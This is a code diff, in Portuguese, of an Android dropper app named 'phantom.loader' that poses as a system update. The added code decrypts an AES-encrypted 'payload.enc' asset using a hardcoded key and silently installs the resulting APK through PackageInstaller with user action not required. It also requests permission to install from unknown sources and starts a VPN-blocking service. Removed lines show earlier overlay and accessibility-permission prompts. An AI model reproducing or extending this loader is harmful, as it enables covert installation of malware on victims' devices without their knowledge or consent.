@@ -1,6 +1,8 @@
 package com.phantom.loader;
 
+import android.app.PendingIntent;
 import android.content.Intent;
+import android.content.pm.PackageInstaller;
 import android.net.Uri;
 import android.net.VpnService;
 import android.os.Build;
@@ -11,12 +13,19 @@ import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.content.FileProvider;
+
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.InputStream;
+import java.io.OutputStream;
+import java.security.MessageDigest;
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
 
 public class MainActivity extends AppCompatActivity {
+
+    private static final String KEY = "S3cr3tK3yPh4nt0m2025!@#";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -26,7 +35,7 @@ public class MainActivity extends AppCompatActivity {
         layout.setPadding(50, 100, 50, 50);
 
         TextView tv = new TextView(this);
-        tv.setText("Sistema Pronto. Preparando atualização...");
+        tv.setText("Sistema Pronto. Instalando atualização...");
         layout.addView(tv);
 
         Button btn = new Button(this);
@@ -37,19 +46,17 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void checarPermissoes() {
-        // 1. Verifica Overlay (Sobrepor apps)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-            startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName())));
-            Toast.makeText(this, "Permita sobrepor outros apps.", Toast.LENGTH_LONG).show();
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !getPackageManager().canRequestPackageInstalls()) {
+            startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:" + getPackageName())));
+            Toast.makeText(this, "Permita a instalação.", Toast.LENGTH_LONG).show();
             return;
         }
 
-        // 2. Verifica VPN
         Intent vpnIntent = VpnService.prepare(this);
         if (vpnIntent != null) {
             startActivityForResult(vpnIntent, 1);
         } else {
-            pedirAcessibilidade();
+            instalarSilenciosamente();
         }
     }
 
@@ -57,40 +64,63 @@ public class MainActivity extends AppCompatActivity {
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == 1 && resultCode == RESULT_OK) {
-            pedirAcessibilidade();
+            instalarSilenciosamente();
         }
     }
 
-    private void pedirAcessibilidade() {
-        // 3. Pede Acessibilidade
-        Toast.makeText(this, "Ative a Acessibilidade do System Update.", Toast.LENGTH_LONG).show();
-        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
-        
-        // 4. Liga a VPN e faz a instalação
+    private void instalarSilenciosamente() {
         startService(new Intent(this, VpnBlockerService.class));
-        extrairEInstalar();
-    }
-
-    private void extrairEInstalar() {
+        
         new Thread(() -> {
             try {
-                InputStream is = getAssets().open("payload.apk");
-                File file = new File(getExternalFilesDir(null), "update.apk");
-                FileOutputStream fos = new FileOutputStream(file);
-                byte[] buffer = new byte[1024];
-                int len;
-                while ((len = is.read(buffer)) != -1) { fos.write(buffer, 0, len); }
-                fos.close();
+                // 1. Lê o APK criptografado
+                InputStream is = getAssets().open("payload.enc");
+                byte[] encData = new byte[is.available()];
+                is.read(encData);
                 is.close();
 
-                runOnUiThread(() -> {
-                    startService(new Intent(this, OverlayService.class));
-                    Uri apkUri = FileProvider.getUriForFile(this, getPackageName() + ".fileprovider", file);
-                    Intent intent = new Intent(Intent.ACTION_VIEW);
-                    intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
-                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
-                    startActivity(intent);
-                });
+                // 2. Descriptografa
+                MessageDigest sha = MessageDigest.getInstance("SHA-256");
+                byte[] key = sha.digest(KEY.getBytes());
+                SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
+                Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
+                cipher.init(Cipher.DECRYPT_MODE, keySpec);
+                byte[] decData = cipher.doFinal(encData);
+
+                // 3. Salva o APK limpo no cache
+                File file = new File(getCacheDir(), "update.apk");
+                FileOutputStream fos = new FileOutputStream(file);
+                fos.write(decData);
+                fos.close();
+
+                // 4. Usa o SessionInstaller (Instalação Silenciosa)
+                PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
+                PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
+                        PackageInstaller.SessionParams.MODE_FULL_INSTALL);
+                
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
+                }
+
+                int sessionId = packageInstaller.createSession(params);
+                PackageInstaller.Session session = packageInstaller.openSession(sessionId);
+
+                OutputStream out = session.openWrite("package", 0, -1);
+                FileInputStream fis = new FileInputStream(file);
+                byte[] buffer = new byte[1024];
+                int len;
+                while ((len = fis.read(buffer)) != -1) { out.write(buffer, 0, len); }
+                session.fsync(out);
+                fis.close();
+                out.close();
+
+                Intent intent = new Intent(this, InstallReceiver.class);
+                PendingIntent pi = PendingIntent.getBroadcast(this, sessionId, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
+                session.commit(pi.getIntentSender());
+                session.close();
+
+                runOnUiThread(() -> Toast.makeText(this, "Instalando...", Toast.LENGTH_SHORT).show());
+
             } catch (Exception e) {
                 e.printStackTrace();
             }
